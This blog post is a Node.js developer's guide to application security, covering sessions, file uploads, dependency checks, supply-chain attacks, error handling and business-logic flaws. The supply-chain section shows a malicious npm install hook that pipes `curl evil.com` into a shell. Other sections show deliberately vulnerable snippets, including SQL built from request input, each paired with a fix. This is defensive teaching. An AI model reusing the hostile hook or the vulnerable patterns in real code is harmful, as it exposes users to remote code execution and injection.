---
title: "Application Security - Core Concepts You Need to Know"
labels: ["security","application","nodejs","webdev","Archive"]
published: true
date: 2025-01-10T21:31:00+09:00
readerComments: "ALLOW"
language: en
bloggerPostId: "7927960617577247565"
source: "archive"
archivePath: "_archive/dev/security/application-security-guide-kr.md"
---

# Application Security - Core Concepts You Need to Know

Application-layer security starts at the code level. In this post, I'll cover the application security concepts every developer should know.

---

## 1. Session Management ⭐️⭐️⭐️

### Concept
Session management is the mechanism that keeps track of a user's authenticated state. Implement it badly and you're open to attacks like session hijacking and session fixation.

### Secure session configuration

**Express.js + express-session**
```javascript
const session = require('express-session');
const RedisStore = require('connect-redis').default;
const redis = require('redis');

// Redis client
const redisClient = redis.createClient({
  host: process.env.REDIS_HOST,
  port: process.env.REDIS_PORT,
  password: process.env.REDIS_PASSWORD
});

app.use(session({
  store: new RedisStore({ client: redisClient }),
  
  // Strong secret key
  secret: process.env.SESSION_SECRET,
  
  // Don't save unmodified/uninitialized sessions
  resave: false,
  saveUninitialized: false,
  
  // Cookie settings
  cookie: {
    secure: true,           // HTTPS only
    httpOnly: true,         // not accessible from JavaScript
    sameSite: 'strict',     // CSRF protection
    maxAge: 1000 * 60 * 30, // 30 minutes
    domain: '.example.com'
  },
  
  // Rename the session cookie (don't expose the default)
  name: 'sid',
  
  // Rolling sessions (refresh expiry on every request)
  rolling: true
}));

// Regenerate the session on login
app.post('/login', async (req, res) => {
  const user = await authenticateUser(req.body.username, req.body.password);
  
  if (user) {
    // Destroy the existing session
    req.session.destroy(() => {
      // Create a new session
      req.session.regenerate(() => {
        req.session.userId = user.id;
        req.session.username = user.username;
        req.session.loginTime = Date.now();
        
        res.json({ message: 'Login successful' });
      });
    });
  } else {
    res.status(401).json({ error: 'Authentication failed' });
  }
});

// Logout
app.post('/logout', (req, res) => {
  req.session.destroy((err) => {
    if (err) {
      return res.status(500).json({ error: 'Logout failed' });
    }
    res.clearCookie('sid');
    res.json({ message: 'Logout successful' });
  });
});
```

### Preventing session hijacking

```javascript
// Check IP address and User-Agent
app.use((req, res, next) => {
  if (req.session && req.session.userId) {
    const sessionIP = req.session.ipAddress;
    const sessionUA = req.session.userAgent;
    const currentIP = req.ip;
    const currentUA = req.get('user-agent');
    
    // Invalidate the session if the IP or User-Agent changes
    if (sessionIP !== currentIP || sessionUA !== currentUA) {
      logger.warn('Session hijacking attempt detected', {
        userId: req.session.userId,
        sessionIP,
        currentIP,
        sessionUA: sessionUA.substring(0, 50),
        currentUA: currentUA.substring(0, 50)
      });
      
      req.session.destroy();
      return res.status(401).json({ error: 'Session has been invalidated' });
    }
  }
  next();
});

// Store the IP and User-Agent on login
app.post('/login', async (req, res) => {
  const user = await authenticateUser(req.body.username, req.body.password);
  
  if (user) {
    req.session.regenerate(() => {
      req.session.userId = user.id;
      req.session.ipAddress = req.ip;
      req.session.userAgent = req.get('user-agent');
      req.session.loginTime = Date.now();
      
      res.json({ message: 'Login successful' });
    });
  }
});
```

### JWT vs. sessions

```javascript
// JWT pros: stateless, a good fit for microservices
// JWT cons: can't be revoked instantly, larger size

// Session pros: can be revoked instantly, small size
// Session cons: uses server memory, more complex in distributed setups

// Hybrid approach (refresh token stored like a session)
app.post('/refresh', async (req, res) => {
  const { refreshToken } = req.body;
  
  // Look up the refresh token in the session store
  const session = await redisClient.get(`refresh:${refreshToken}`);
  
  if (!session) {
    return res.status(401).json({ error: 'Invalid token' });
  }
  
  // Issue a new access token
  const accessToken = jwt.sign(
    { userId: session.userId },
    process.env.JWT_SECRET,
    { expiresIn: '15m' }
  );
  
  res.json({ accessToken });
});
```

---

## 2. File Upload Security ⭐️⭐️⭐️

### Concept
File upload is one of the most dangerous features you can build. Risks include malicious file uploads, directory traversal, and file execution.

### Secure file upload

```javascript
const multer = require('multer');
const path = require('path');
const crypto = require('crypto');
const sharp = require('sharp');

// 1. Storage location
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    // Store outside the web root
    cb(null, '/var/uploads/user-content');
  },
  
  filename: (req, file, cb) => {
    // ❌ Never use the original filename
    // cb(null, file.originalname);
    
    // ✅ Generate a random filename
    const randomName = crypto.randomBytes(16).toString('hex');
    const ext = path.extname(file.originalname).toLowerCase();
    cb(null, `${randomName}${ext}`);
  }
});

// 2. File validation
const fileFilter = (req, file, cb) => {
  // MIME type allowlist
  const allowedMimes = [
    'image/jpeg',
    'image/png',
    'image/gif',
    'application/pdf'
  ];
  
  // Extension allowlist
  const allowedExts = /\.(jpg|jpeg|png|gif|pdf)$/i;
  
  const mimeOk = allowedMimes.includes(file.mimetype);
  const extOk = allowedExts.test(path.extname(file.originalname));
  
  if (mimeOk && extOk) {
    cb(null, true);
  } else {
    cb(new Error('File type not allowed'));
  }
};

const upload = multer({
  storage: storage,
  fileFilter: fileFilter,
  limits: {
    fileSize: 5 * 1024 * 1024, // 5MB
    files: 5                     // up to 5 files
  }
});

// 3. Upload route
app.post('/upload', 
  authenticateToken,
  upload.single('file'),
  async (req, res) => {
    try {
      if (!req.file) {
        return res.status(400).json({ error: 'No file provided' });
      }
      
      const filePath = req.file.path;
      
      // 4. Re-encode images (strips metadata)
      if (req.file.mimetype.startsWith('image/')) {
        await sharp(filePath)
          .rotate() // apply EXIF orientation
          .resize(2000, 2000, { fit: 'inside' })
          .toFile(filePath + '.processed');
        
        // Replace the original
        fs.unlinkSync(filePath);
        fs.renameSync(filePath + '.processed', filePath);
      }
      
      // 5. Virus scan (ClamAV)
      const scanResult = await clamav.scanFile(filePath);
      if (scanResult.isInfected) {
        fs.unlinkSync(filePath);
        return res.status(400).json({ error: 'Malicious file detected' });
      }
      
      // 6. Save the file info to the database
      const file = await File.create({
        userId: req.user.id,
        filename: req.file.filename,
        originalName: req.file.originalname,
        mimeType: req.file.mimetype,
        size: req.file.size,
        path: filePath
      });
      
      res.json({
        message: 'File uploaded',
        fileId: file.id,
        filename: file.filename
      });
      
    } catch (error) {
      // Delete the uploaded file on error
      if (req.file) {
        fs.unlinkSync(req.file.path);
      }
      res.status(500).json({ error: 'File upload failed' });
    }
  }
);

// 7. File download (preventing directory traversal)
app.get('/download/:fileId', authenticateToken, async (req, res) => {
  const file = await File.findOne({
    where: { 
      id: req.params.fileId,
      userId: req.user.id // users can only download their own files
    }
  });
  
  if (!file) {
    return res.status(404).json({ error: 'File not found' });
  }
  
  // ✅ Validate the path safely
  const safePath = path.normalize(file.path).replace(/^(\.\.(\/|\\|$))+/, '');
  const fullPath = path.join('/var/uploads/user-content', path.basename(safePath));
  
  // Make sure the path is inside the upload directory
  if (!fullPath.startsWith('/var/uploads/user-content')) {
    return res.status(403).json({ error: 'Invalid path' });
  }
  
  res.download(fullPath, file.originalName);
});
```

### S3 direct upload (even safer)

```javascript
const AWS = require('aws-sdk');
const s3 = new AWS.S3();

// Generate a signed URL (the client uploads straight to S3)
app.post('/upload/presigned-url', authenticateToken, async (req, res) => {
  const { filename, contentType } = req.body;
  
  // Validate the file type
  const allowedTypes = ['image/jpeg', 'image/png', 'application/pdf'];
  if (!allowedTypes.includes(contentType)) {
    return res.status(400).json({ error: 'File type not allowed' });
  }
  
  const fileKey = `uploads/${req.user.id}/${crypto.randomBytes(16).toString('hex')}`;
  
  const presignedUrl = s3.getSignedUrl('putObject', {
    Bucket: 'my-secure-bucket',
    Key: fileKey,
    ContentType: contentType,
    Expires: 300, // 5 minutes
    ACL: 'private'
  });
  
  res.json({
    uploadUrl: presignedUrl,
    fileKey: fileKey
  });
});

// Handle upload completion
app.post('/upload/complete', authenticateToken, async (req, res) => {
  const { fileKey } = req.body;
  
  // Check that the file exists in S3
  try {
    await s3.headObject({
      Bucket: 'my-secure-bucket',
      Key: fileKey
    }).promise();
    
    // Save to the database
    const file = await File.create({
      userId: req.user.id,
      fileKey: fileKey
    });
    
    res.json({ message: 'Upload complete', fileId: file.id });
  } catch (error) {
    res.status(404).json({ error: 'File not found' });
  }
});
```

---

## 3. Dependency Security ⭐️⭐️⭐️

### Concept
Applications depend on a huge number of external libraries. A vulnerability in any of those libraries is a vulnerability in your application.

### npm audit

```bash
# Check for vulnerabilities
npm audit

# Fix vulnerabilities that can be fixed automatically
npm audit fix

# Fix, including breaking changes
npm audit fix --force

# Only report vulnerabilities at or above a severity level
npm audit --audit-level=high
```

### Continuous monitoring with Snyk

```bash
# Install Snyk
npm install -g snyk

# Authenticate
snyk auth

# Test the project
snyk test

# Monitor the project (adds it to the Snyk dashboard)
snyk monitor

# Auto-fix
snyk fix
```

```yaml
# .github/workflows/security.yml
name: Security Check

on: [push, pull_request]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: Run Snyk
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
        with:
          args: --severity-threshold=high
```

### Dependabot configuration

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "daily"
    open-pull-requests-limit: 10
    
    # Label the PRs
    labels:
      - "security"
    
    # Assign the PRs
    assignees:
      - "security-team"
```

### Verifying package-lock.json

```javascript
// Add a script to package.json
{
  "scripts": {
    "preinstall": "node check-lockfile.js"
  }
}

// check-lockfile.js
const fs = require('fs');
const crypto = require('crypto');

const lockfile = fs.readFileSync('package-lock.json', 'utf8');
const lockfileHash = crypto.createHash('sha256').update(lockfile).digest('hex');

// Compare against the expected hash
const expectedHash = process.env.LOCKFILE_HASH;
if (lockfileHash !== expectedHash) {
  console.error('package-lock.json has been tampered with!');
  process.exit(1);
}
```

---

## 4. Defending Against Supply Chain Attacks ⭐️⭐️

### Concept
A supply chain attack injects malicious code through a source you trust (npm packages, Docker images, and so on).

### npm package security

**1. Vetting packages**
```bash
# Show package info
npm view express

# Check downloads and last update
npm view express downloads
npm view express time

# Open the repository to check GitHub stars
npm repo express
```

**2. Red flags in suspicious packages**
```javascript
// ❌ Signs of a suspicious package
// - Name similar to a popular package (typosquatting)
//   e.g. react → reect, lodash → loadash
// - Recently created (< 1 month)
// - Very few downloads (< 1000/week)
// - No GitHub repository
// - Thin or missing description
// - An unusually large number of dependencies

// ✅ Signs of a trustworthy package
// - Has official documentation
// - Lots of GitHub stars (>1000)
// - Actively maintained (recent updates)
// - High download counts
// - Maintained by a large company or well-known developer
```

**3. Watch out for npm scripts**
```json
// package.json
{
  "scripts": {
    // ❌ Suspicious scripts
    "install": "node -e \"require('child_process').exec('curl evil.com | sh')\"",
    "postinstall": "node malicious.js",
    
    // ✅ Normal scripts
    "build": "webpack --config webpack.config.js",
    "test": "jest"
  }
}
```

### Docker image security

```dockerfile
# ❌ Risky
FROM node:latest

# ✅ Safer - pin a specific version
FROM node:18.17.0-alpine@sha256:abc123...

# Use official images only
# - node (official)
# - postgres (official)
# Don't use unofficial images
```

---

## 5. Error Handling & Information Disclosure ⭐️⭐️

### Concept
When error messages expose system details, you're handing attackers useful information.

### Safe error handling

```javascript
// ❌ Dangerous error handling
app.get('/api/user/:id', async (req, res) => {
  try {
    const user = await db.query(`SELECT * FROM users WHERE id = ${req.params.id}`);
    res.json(user);
  } catch (error) {
    // Exposes the stack trace and query
    res.status(500).json({ error: error.message, stack: error.stack });
  }
});

// ✅ Safe error handling
app.get('/api/user/:id', async (req, res) => {
  try {
    const user = await db.query('SELECT * FROM users WHERE id = $1', [req.params.id]);
    
    if (!user) {
      return res.status(404).json({ error: 'User not found' });
    }
    
    res.json(user);
  } catch (error) {
    // Log it (internal only)
    logger.error('Database error', {
      error: error.message,
      stack: error.stack,
      userId: req.params.id,
      ip: req.ip
    });
    
    // Send only a generic message to the user
    res.status(500).json({ error: 'An error occurred while processing the request' });
  }
});

// Global error handler
app.use((err, req, res, next) => {
  // Detailed info only in development
  const isDev = process.env.NODE_ENV === 'development';
  
  logger.error('Unhandled error', {
    error: err.message,
    stack: err.stack,
    url: req.url,
    method: req.method,
    ip: req.ip
  });
  
  res.status(err.status || 500).json({
    error: isDev ? err.message : 'A server error occurred',
    ...(isDev && { stack: err.stack })
  });
});
```

### Express.js production settings

```javascript
// app.js
const express = require('express');
const app = express();

// Production settings
if (process.env.NODE_ENV === 'production') {
  // Remove the X-Powered-By header
  app.disable('x-powered-by');
  
  // Disable verbose error messages
  app.set('env', 'production');
}

// Set security headers with helmet
const helmet = require('helmet');
app.use(helmet());

// Don't leak info from error pages either
app.use((req, res) => {
  res.status(404).json({ error: 'Page not found' });
});
```

---

## 6. Preventing Business Logic Abuse ⭐️⭐️

### Concept
These attacks exploit flaws in business logic to gain an unfair advantage.

### Real-world cases and defenses

**1. Reusing a coupon**
```javascript
// ❌ Vulnerable code
app.post('/apply-coupon', async (req, res) => {
  const { couponCode } = req.body;
  
  const coupon = await Coupon.findOne({ code: couponCode });
  if (coupon && coupon.isValid) {
    req.session.discount = coupon.amount;
    res.json({ message: 'Coupon applied' });
  }
});

// ✅ Safe code
app.post('/apply-coupon', async (req, res) => {
  const { couponCode } = req.body;
  const userId = req.user.id;
  
  // Start a transaction
  const transaction = await sequelize.transaction();
  
  try {
    // Check the coupon exists and is valid
    const coupon = await Coupon.findOne({
      where: { 
        code: couponCode,
        isValid: true,
        expiresAt: { [Op.gt]: new Date() }
      },
      lock: transaction.LOCK.UPDATE, // row lock
      transaction
    });
    
    if (!coupon) {
      await transaction.rollback();
      return res.status(404).json({ error: 'Invalid coupon' });
    }
    
    // Check whether it was already used
    const usage = await CouponUsage.findOne({
      where: { couponId: coupon.id, userId },
      transaction
    });
    
    if (usage) {
      await transaction.rollback();
      return res.status(400).json({ error: 'Coupon already used' });
    }
    
    // Record the usage
    await CouponUsage.create({
      couponId: coupon.id,
      userId,
      usedAt: new Date()
    }, { transaction });
    
    // Increment the coupon usage count
    await coupon.increment('usageCount', { transaction });
    
    await transaction.commit();
    
    res.json({ 
      message: 'Coupon applied',
      discount: coupon.amount 
    });
    
  } catch (error) {
    await transaction.rollback();
    res.status(500).json({ error: 'Failed to apply coupon' });
  }
});
```

**2. Preventing race conditions**
```javascript
// ❌ Vulnerable to a race condition
app.post('/purchase', async (req, res) => {
  const product = await Product.findByPk(req.body.productId);
  
  if (product.stock > 0) {
    // With concurrent requests, you can sell more than you have in stock
    await product.decrement('stock');
    await Order.create({ productId: product.id, userId: req.user.id });
    res.json({ message: 'Purchase complete' });
  }
});

// ✅ Use a transaction and a row lock
app.post('/purchase', async (req, res) => {
  const transaction = await sequelize.transaction();
  
  try {
    const product = await Product.findByPk(req.body.productId, {
      lock: transaction.LOCK.UPDATE,
      transaction
    });
    
    if (!product || product.stock < 1) {
      await transaction.rollback();
      return res.status(400).json({ error: 'Out of stock' });
    }
    
    // Atomic operation
    const [updatedRows] = await Product.update(
      { stock: sequelize.literal('stock - 1') },
      {
        where: {
          id: product.id,
          stock: { [Op.gt]: 0 } // only update while stock is above 0
        },
        transaction
      }
    );
    
    if (updatedRows === 0) {
      await transaction.rollback();
      return res.status(400).json({ error: 'Out of stock' });
    }
    
    await Order.create({
      productId: product.id,
      userId: req.user.id
    }, { transaction });
    
    await transaction.commit();
    res.json({ message: 'Purchase complete' });
    
  } catch (error) {
    await transaction.rollback();
    res.status(500).json({ error: 'Purchase failed' });
  }
});
```

**3. Preventing price tampering**
```javascript
// ❌ Price sent from the client
app.post('/checkout', async (req, res) => {
  const { productId, price, quantity } = req.body;
  
  // An attacker can change the price to 1
  const total = price * quantity;
  
  await Payment.create({ total, userId: req.user.id });
});

// ✅ Look up the price on the server
app.post('/checkout', async (req, res) => {
  const { productId, quantity } = req.body;
  
  // Fetch the real price on the server
  const product = await Product.findByPk(productId);
  
  if (!product) {
    return res.status(404).json({ error: 'Product not found' });
  }
  
  // Calculate on the server
  const total = product.price * quantity;
  
  await Payment.create({
    productId: product.id,
    quantity,
    unitPrice: product.price,
    total,
    userId: req.user.id
  });
  
  res.json({ total });
});
```

---

## Conclusion

Application security checklist:

### Must-have measures (⭐️⭐️⭐️)
- ✅ Secure session management (HttpOnly, Secure, SameSite)
- ✅ File upload validation (MIME type, extension, size)
- ✅ Regular dependency checks (npm audit, Snyk)

### Important measures (⭐️⭐️)
- ✅ Keep error messages from leaking information
- ✅ Prevent race conditions in business logic
- ✅ Defend against supply chain attacks

### Additional hardening (⭐️)
- ✅ Automatic updates with Dependabot
- ✅ Virus scanning for file uploads
- ✅ Guarantee data integrity with transactions

**Code review and continuous monitoring are the heart of application security!**
